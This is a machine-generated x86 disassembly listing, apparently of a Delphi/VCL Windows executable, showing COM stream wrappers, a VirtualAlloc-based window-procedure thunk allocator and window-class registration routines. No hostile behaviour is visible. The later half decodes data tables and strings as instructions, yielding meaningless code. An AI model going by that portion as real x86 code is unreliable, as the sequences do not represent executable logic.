push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_41a1e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_40324c
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a240
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41a264
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403168
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_41a2ac
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
mov edx esi
call sub_41a4dc
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_41a314
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_41a4dc
mov edx ebx
mov eax esi
call sub_41a4d0
sub_41a358
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419a50
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_41a39c
push ebx
push esi
push edi
call sub_403524
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419a9c
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_419d50
jmp r-xdata
mov eax esi
call sub_414180
mov edx eax
mov eax edi
call sub_41a4dc
lea eax [ edi + 0x50 ]
call sub_40d3ac
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40350c
sub_41a3fc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419d6c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_41a428
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_41a444
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_41a460
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_414098
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_41a4dc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_413f38
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_414098
cmp ebp eax
jne r-xdata
sub_41a51c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_419d50
mov edx ebx
call sub_419b20
sub_41a548
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403168
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_41a590
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403198
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_41a5c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41a617
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a630
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41a67f
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a698
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41a702
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41a71c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41a765
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_415d74
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41a780
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_4056a8
xor eax eax
push ebp
push sub_41a96d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41a946
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026dc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41a935
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026fc
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_4039d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a974
lea eax [ ebp + 0xc ]
call sub_405634
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_4039d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41a9b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41aa13
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41aa44
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_414404
mov edi eax
xor eax eax
push ebp
push sub_41aa99
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aaa0
mov eax [ rw-data ]
call sub_414468
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_414098
call sub_403198
inc esi
dec ebx
jne r-xdata
sub_41aab8
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41aae0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028d8
mov edx sub_41aab8
lea eax [ esi + 0x5 ]
call sub_41aad8
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41aad8
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41ab9c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406a28
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41aae0
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41ac50
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41ab78
sub_41ac78
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41ad1c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ad23
retn
mov eax [ rw-data ]
call sub_413838
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41aa44
xor edx edx
xor eax eax
call sub_416c74
mov eax rw-data
call sub_40d3ac
call sub_405d64
lea eax [ eax + 0xc ]
call sub_40d3ac
mov eax rw-data
call sub_40d3ac
mov eax rw-data
call sub_405634
mov eax sub_41aab0
call sub_4054d0
mov eax rw-data
call sub_40d3ac
call sub_419870
mov eax rw-data
call sub_40d3ac
mov eax rw-data
call sub_405634
sub_41ad28
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41adb1
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41adb8
retn
call sub_41983c
mov eax sub_41aab0
call sub_4054c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d0ec
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_40564c
mov dl 0x1
mov eax [ r-xdata ]
call sub_413100
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4142ac
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4142ac
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41adbc
salc
inc edi
add [ edx + 0x640000ff ] cl
salc
inc edi
add [ ebx + 0x640000ff ] cl
salc
inc edi
add [ edi + edi * 8 - 0x299c0000 ] cl
inc edi
add [ ebp + 0x640000ff ] cl
salc
inc edi
add [ esi + 0x640000ff ] cl
salc
inc edi
add [ edi + 0x640000ff ] cl
salc
inc edi
add [ eax - 0x1 ] dh
add [ eax ] al
salc
inc edi
add [ ecx - 0x1 ] dh
add [ eax ] al
salc
inc edi
add [ edx - 0x1 ] dh
add [ eax ] al
salc
inc edi
add [ ebx - 0x1 ] dh
add [ eax ] al
salc
inc edi
add [ edi + edi * 8 ] dh
add [ esi + edx * 8 + 0x47 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
salc
inc edi
add [ esi - 0x1 ] dh
add [ eax ] al
salc
inc edi
add [ edi - 0x1 ] dh
add [ eax ] al
salc
inc edi
add [ eax - 0x1 ] bh
add [ eax ] al
salc
inc edi
add [ ecx - 0x1 ] bh
add [ eax ] al
salc
inc edi
add [ edx - 0x1 ] bh
add [ eax ] al
salc
inc edi
add [ ebx - 0x1 ] bh
add [ eax ] al
salc
inc edi
add [ edi + edi * 8 ] bh
add [ esi + edx * 8 + 0x47 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
salc
inc edi
add [ esi - 0x1 ] bh
add [ eax ] al
salc
inc edi
add [ edi - 0x1 ] bh
add [ eax ] al
salc
inc edi
add [ eax - 0x1 ] ah
add [ eax ] al
salc
inc edi
add [ ecx - 0x1 ] ah
add [ eax ] al
salc
inc edi
add [ edx - 0x1 ] ah
add [ eax ] al
salc
inc edi
add [ ebx - 0x1 ] ah
add [ eax ] al
salc
inc edi
add [ edi + edi * 8 ] ah
add [ esi + edx * 8 + 0x47 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
salc
inc edi
add [ esi - 0x1 ] ah
add [ eax ] al
salc
inc edi
add [ edi - 0x1 ] ah
add [ eax ] al
salc
inc edi
add [ eax - 0x1 ] ch
add [ eax ] al
salc
inc edi
add [ ecx - 0x1 ] ch
add [ eax ] al
salc
inc edi
add [ edx - 0x1 ] ch
add [ eax ] al
salc
inc edi
add [ ebx - 0x1 ] ch
add [ eax ] al
salc
inc edi
add [ edi + edi * 8 ] ch
add [ esi + edx * 8 + 0x47 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
salc
inc edi
add [ esi - 0x1 ] ch
add [ eax ] al
salc
inc edi
add [ edi - 0x1 ] ch
add [ eax ] al
salc
inc edi
add [ eax - 0x1 ] dl
add [ eax ] al
salc
inc edi
add [ ecx - 0x1 ] dl
add [ eax ] al
salc
inc edi
add [ edx - 0x1 ] dl
add [ eax ] al
salc
inc edi
add [ ebx - 0x1 ] dl
add [ eax ] al
salc
inc edi
add [ edi + edi * 8 ] dl
add [ esi + edx * 8 + 0x47 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
salc
inc edi
add [ esi - 0x1 ] dl
add [ eax ] al
salc
inc edi
add [ edi - 0x1 ] dl
add [ eax ] al
salc
inc edi
add [ eax - 0x1 ] bl
add [ eax ] al
salc
inc edi
add [ ecx - 0x1 ] bl
add [ eax ] al
salc
inc edi
add [ edx - 0x1 ] bl
add [ eax ] al
salc
inc edi
add [ ebx - 0x1 ] bl
add [ eax ] al
salc
inc edi
add [ edi + edi * 8 ] bl
add [ esi + edx * 8 + 0x47 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
salc
inc edi
add [ esi - 0x1 ] bl
add [ eax ] al
salc
inc edi
add [ edi - 0x1 ] bl
add [ eax ] al
salc
inc edi
add [ eax - 0x1 ] al
add [ eax ] al
salc
inc edi
add [ ecx - 0x1 ] al
add [ eax ] al
salc
inc edi
add [ edx - 0x1 ] al
add [ eax ] al
salc
inc edi
add [ ebx - 0x1 ] al
add [ eax ] al
salc
inc edi
add [ edi + edi * 8 ] al
add [ esi + edx * 8 + 0x47 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
salc
inc edi
add [ esi - 0x1 ] al
add [ eax ] al
salc
inc edi
add [ edi - 0x1 ] al
add [ eax ] al
salc
inc edi
add [ eax - 0x1 ] cl
add [ eax ] al
salc
inc edi
add [ ecx - 0x1 ] cl
add [ eax ] al
salc
inc edi
add [ edx - 0x1 ] cl
add [ eax ] al
salc
inc edi
add [ ebx - 0x1 ] cl
add [ eax ] al
salc
inc edi
add [ edi + edi * 8 ] cl
add [ esi + edx * 8 + 0x47 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
salc
inc edi
add [ esi - 0x1 ] cl
add [ eax ] al
salc
inc edi
add [ edi - 0x1 ] cl
add [ eax ] al
salc
inc edi
add [ eax ] dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
salc
inc edi
add [ 0x640000ff ] dh
salc
inc edi
add [ esi ] dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
salc
inc edi
add [ 0x640000ff ] bh
salc
inc edi
add [ esi ] bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ ecx ] ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_41b0a1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b0a8
retn
sub_41b0b4
mov eax 0x10041b0
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
sbb [ ecx + 0x41 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ecx + 0xc0041 ] dh
add [ eax ] al
jo r-xdata
xor eax [ eax ]
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ eax + 0x18004031 ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
inc eax
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jae r-xdata
popad
insd
nop
call 0x141f39a
or al 0x54
inc esi
push esp
je r-xdata
jae r-xdata
outsb
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
xchg esp eax
mov cl 0x41
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add al dl
mov dl 0x41
add [ edi ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
add al 0xb2
inc ecx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ eax + 0x90041b1 ] dl
jo r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
pop es
bound esi [ ebx + 0x53 ]
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
mov dl 0x41
add [ ebx + 0x41b26cc0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
add [ edx - 0x3f74ffbf ] dh
insb
mov dl 0x41
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
mov dl 0x41
add [ esi ] al
jae r-xdata
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
dec esi
outsd
je r-xdata
dec esi
outsd
outsd
je r-xdata
pop eax
dec esi
jo r-xdata
inc esp
outsd
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xb254c08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax - 0x4e ] ch
inc ecx
add [ edi ] al
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
inc eax
add al ch
xor eax [ eax ]
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ eax ] ch
inc esi
inc ecx
